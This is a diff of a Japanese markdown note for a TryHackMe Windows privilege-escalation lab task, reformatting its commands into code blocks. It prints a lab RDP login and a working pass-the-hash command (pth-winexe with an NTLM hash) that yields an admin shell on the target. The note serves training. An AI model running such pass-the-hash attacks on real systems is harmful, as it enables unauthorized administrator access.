@@ -8,8 +8,7 @@
 
 
 ### 学習環境
-TryHackMe Windows PrivEsc Task12<br>
-（Windows 特権昇格）<br>
+TryHackMe / Windows PrivEsc（Windows 特権昇格）/ Task12<br>
 [https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)
 
 ### 必要なもの
@@ -18,18 +17,20 @@ TryHackMe Windows PrivEsc Task12<br>
 
 ## 実行するコマンド
 ※`<targetIP>`は起動したマシンのIPアドレスに変更してください
-<br>
 
-#### 【Task1】
-- RDPで脆弱なWindowsを起動<br>
-`xfreerdp /u:user /p:password321 /cert:ignore /v:<targetIP>`
-- ユーザを確認<br>
-`whoami`
-<br>
+#### 【Task1】RDPで脆弱なWindowsを起動
+```
+# RDPで脆弱なWindowsを起動<br>
+xfreerdp /u:user /p:password321 /cert:ignore /v:<targetIP>
+# ユーザを確認
+whoami
+```
 
-#### 【Task12】
-- Pass the Hash攻撃を実行<br>
-`pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<targetIP> cmd.exe`
-- ユーザを確認<br>
-`whoami`
+#### 【Task12】Pass the Hash攻撃を実行
+```
+# Pass the Hash攻撃を実行する
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<targetIP> cmd.exe
 
+# ユーザを確認<br>
+whoami
+```
